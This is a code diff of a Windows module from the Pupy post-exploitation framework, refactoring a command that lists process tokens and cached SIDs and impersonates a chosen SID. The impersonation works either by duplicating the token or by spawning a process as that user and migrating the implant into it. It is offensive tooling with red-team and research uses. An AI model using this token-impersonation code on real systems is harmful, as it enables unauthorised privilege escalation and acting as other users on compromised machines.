@@ -1,39 +1,90 @@
-# -*- coding: UTF8 -*-
-from pupylib.PupyModule import *
-from pupylib.utils.rpyc_utils import redirected_stdo, obtain
+# -*- coding: utf-8 -*-
+
+from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from modules.lib.windows.migrate import migrate
-import ctypes
+from pupylib.PupyOutput import Table, MultiPart
 
 __class_name__="ImpersonateModule"
 
 @config(compat="windows", category="exploit")
 class ImpersonateModule(PupyModule):
     """ list/impersonate process tokens """
-    max_clients=1
+
     dependencies=["pupwinutils.security"]
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="impersonate", description=self.__doc__)
-        self.arg_parser.add_argument("-l", "--list", action='store_true', help="list available Sids")
-        self.arg_parser.add_argument("-i", "--impersonate", metavar="SID", help="impersonate a sid")
-        self.arg_parser.add_argument("-m", "--migrate", action="store_true", help="spawn a new process and migrate into it")
-        self.arg_parser.add_argument("-r", "--rev2self", action='store_true', help="call rev2self")
+
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog="impersonate", description=cls.__doc__)
+        cls.arg_parser.add_argument("-l", "--list", action='store_true', help="list available Sids")
+        cls.arg_parser.add_argument("-i", "--impersonate", metavar="SID", help="impersonate a sid")
+        cls.arg_parser.add_argument("-m", "--migrate", action="store_true", help="spawn a new process and migrate into it")
+        cls.arg_parser.add_argument("-r", "--rev2self", action='store_true', help="call rev2self")
 
     def run(self, args):
         if args.list:
-            #with redirected_stdo(self):
-            l=obtain(self.client.conn.modules["pupwinutils.security"].ListSids())
-            #self.log('\n'.join(["%s : %s"%x for x in l]))
-            self.rawlog(self.formatter.table_format([{"pid": x[0], "process":x[1], "sid" : x[2], "username":x[3]} for x in l], wl=["pid", "process", "username", "sid"]))
+            ListCachedSids = self.client.remote(
+                'pupwinutils.security', 'ListCachedSids')
+            ListSids = self.client.remote('pupwinutils.security', 'ListSids')
+
+            cached = ListCachedSids()
+            sids = ListSids()
+
+            process_table = []
+            sids_table = []
+            sids_dict = {}
+
+            for (pid, process, sid, username) in sids:
+                process_table.append({
+                    'pid': pid,
+                    'process': process,
+                    'sid': sid,
+                    'username': username
+                })
+
+                sids_dict[sid] = username
+
+            for sid, username in sids_dict.iteritems():
+                sids_table.append({
+                    'sid': sid,
+                    'username': username
+                })
+
+            for (sid, username) in cached:
+                sids_table.append({
+                    'sid': sid + ' (CACHED)',
+                    'username': username
+                })
+
+            self.log(MultiPart([
+                Table(process_table, [
+                    'pid', 'process', 'username', 'sid'
+                ], caption='Process table'),
+
+                Table(sids_table, [
+                    'sid', 'username'
+                ], caption='Available Sids')
+            ]))
+
         elif args.impersonate:
             if args.migrate:
-                proc_pid=self.client.conn.modules["pupwinutils.security"].create_proc_as_sid(args.impersonate)
+                create_proc_as_sid = self.client.remote('pupwinutils.security', 'create_proc_as_sid', False)
+
+                proc_pid = create_proc_as_sid(args.impersonate)
                 migrate(self, proc_pid, keep=True)
             else:
-                self.client.impersonated_dupHandle=self.client.conn.modules["pupwinutils.security"].impersonate_sid_long_handle(args.impersonate, close=False)
-            self.success("Sid %s impersonated !"%args.impersonate)
+                impersonate_sid_long_handle = self.client.remote(
+                    'pupwinutils.security', 'impersonate_sid_long_handle', False)
+
+                self.client.impersonated_dupHandle = impersonate_sid_long_handle(args.impersonate, close=False)
+
+            self.success('Sid {} impersonated !'.format(args.impersonate))
+
         elif args.rev2self:
-            self.client.conn.modules["pupwinutils.security"].rev2self()
-            self.client.impersonated_dupHandle=None
-            self.success("rev2self called")
+            rev2self = self.client.remote('pupwinutils.security', 'rev2self', False)
+
+            rev2self()
+            self.client.impersonated_dupHandle = None
+            self.success('rev2self called')
+
         else:
-            self.error("no option supplied")
+            self.error('no option supplied')
